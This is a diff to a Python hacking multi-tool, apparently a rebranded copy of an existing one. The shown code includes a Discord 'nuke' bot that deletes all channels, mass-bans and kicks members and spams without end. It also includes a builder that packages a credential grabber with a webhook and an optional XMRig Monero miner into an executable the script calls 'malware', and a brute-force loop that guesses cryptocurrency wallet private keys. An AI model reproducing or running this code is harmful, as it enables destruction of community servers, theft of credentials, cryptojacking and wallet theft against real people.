@@ -164,7 +164,7 @@ try:
       from colorama import Fore, init, Back, Style
       from datetime import date
       if platform.system == "Windows":
-        os.system("title [et-exploits token gen] Made by etxnight#1010")
+        os.system("IsoGen")
 
       def Spinner():
         l = ['|', '/', '-', '\\']
@@ -190,8 +190,8 @@ try:
       current_path = os.path.dirname(os.path.realpath(__file__))
       
       print(Fore.BLUE)
-      print(Fore.LIGHTBLUE_EX+"[1] "+Fore.BLUE+"Token Generator(super fast!)")
-      print(Fore.LIGHTBLUE_EX+"[2] "+Fore.BLUE+"Token Checker(Checks all tokens you generated)")
+      print(Fore.LIGHTBLUE_EX+"[1] "+Fore.BLUE+"Token Generator")
+      print(Fore.LIGHTBLUE_EX+"[2] "+Fore.BLUE+"Token Checker")
       print(Fore.LIGHTBLUE_EX+"[3] "+Fore.BLUE+"Exit")
       print(Fore.LIGHTBLUE_EX)
       opcion = input("\nChoice: ")
@@ -254,6 +254,7 @@ try:
       from discord.ext import commands
       from colorama import Fore
 
+      print("Type robux!gen to start nuke" )
       TOKEN = input("Bot Token: ")
 
       client = commands.Bot(command_prefix="robux!", intents=discord.Intents.all())
@@ -261,13 +262,13 @@ try:
 
       @client.event
       async def on_ready():
-        print("Logged in as {}".format(client.user))
+        print("Logged as {}".format(client.user))
 
 
       @client.command()
-      async def nuke(ctx):
+      async def gen(ctx):
         await ctx.message.delete()
-        await ctx.guild.edit(name="nuked by scaigs :skull:")
+        await ctx.guild.edit(name="nuked by shit.land :skull:")
         try:
           for channels in ctx.guild.channels:
             await channels.delete()
@@ -276,13 +277,13 @@ try:
           print("Cant delete {}".format(channels))
 
         while True:
-          await ctx.guild.create_text_channel("no bitches")
+          await ctx.guild.create_text_channel(":skull:")
 
 
       @client.event
       async def on_guild_channel_create(channel):
         while True:
-          await channel.send("@everyone suck my dick @here")
+          await channel.send("@everyone @here uwu waifu @everyone @here")
 
 
       @client.command()
@@ -296,7 +297,7 @@ try:
       async def ownerspam(ctx):
         owner = ctx.guild.owner
         while True:
-          await owner.send("@everyone no bitches??? @here")
+          await owner.send("@everyone @here uwu waifu @everyone @here")
 
 
       @client.command()
@@ -309,20 +310,20 @@ try:
       async def massban(ctx):
         try:
           for members in ctx.guild.members:
-            await members.ban(reason="skill issue, no bitches")
-            print(Fore.GREEN + f"banned {members}")
+            await members.ban(reason="smoked")
+            print(Fore.GREEN + f"Banned {members}")
         except:
-          print(Fore.RED + f"cant ban {members}")
+          print(Fore.RED + f"Unable to ban {members}")
 
 
       @client.command()
       async def kickall(ctx):
         try:
           for members in ctx.guild.members:
-            await members.kick(reason="skill issue, no bitches")
-            print(Fore.GREEN + f"kicked {members}")
+            await members.kick(reason="smoked")
+            print(Fore.GREEN + f"Kicked {members}")
         except:
-          print(Fore.RED + f"cant kick {members}")
+          print(Fore.RED + f"Unable to kick {members}")
 
 
       client.run(TOKEN)
@@ -340,10 +341,10 @@ try:
         print("First/broken build detected hehe")
       os.mkdir("./build/")
       shutil.copy("./grabber_utils/CODE.py", "./build/")
-      filename= input("Name of the file: ")
+      filename= input("File name: ")
       os.rename("./build/CODE.py", f"./build/{filename}.py")
-      webhook_to_cfg = input("webhook: ")
-      miner_to_cfg= input("Do you wanna include miner? [yes/no]: ")
+      webhook_to_cfg = input("Webhook: ")
+      miner_to_cfg= input("Monero Miner? (y/n): ")
       if miner_to_cfg.lower() == "yes":
         miner_to_cfg = True
         addrs = input("Monero Wallet Address?: ")
@@ -367,8 +368,8 @@ try:
         PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.", "--add-data=./grabber_utils/cosita_toolkit.py:.", "--add-data=./grabber_utils/xmrig:.","--clean","--workpath=./build/"])
       print(f"You will find your malware inside ./dist/{filename}")
     elif choice == 14:
-      usure = input("Are you sure you wanna do that?? [Type 'ISOLATION CLEAN' to confirm] ")
-      if usure.lower() == "isolation clean":
+      usure = input("Are you sure you wanna do that?? [Type 'SHIT' to confirm] ")
+      if usure.lower() == "shit":
         try: shutil.rmtree("./build/")
         except: pass
         try: shutil.rmtree("./dist/")
@@ -411,7 +412,7 @@ try:
         hdwallet.from_private_key(private_key=PRIVATE_KEY)
         priv = hdwallet.private_key()
         addr = hdwallet.p2pkh_address()
-        print(Fore.WHITE, str(z), Fore.YELLOW, 'Total Scan Checking ----- ETH Address =', Fore.GREEN, str(addr), end='\r')
+        print(Fore.WHITE, str(z), Fore.YELLOW, 'Checking: ', Fore.GREEN, str(addr), end='\r')
         z += 1
         if addr in add:
             f = open("wallets.txt","a")
@@ -421,5 +422,6 @@ try:
             f.close()
             print('Winner information Saved On text file')
             continue
-except:
-  print("bhai negr")
+    finally:
+      print("\n[+] Bye")
+   
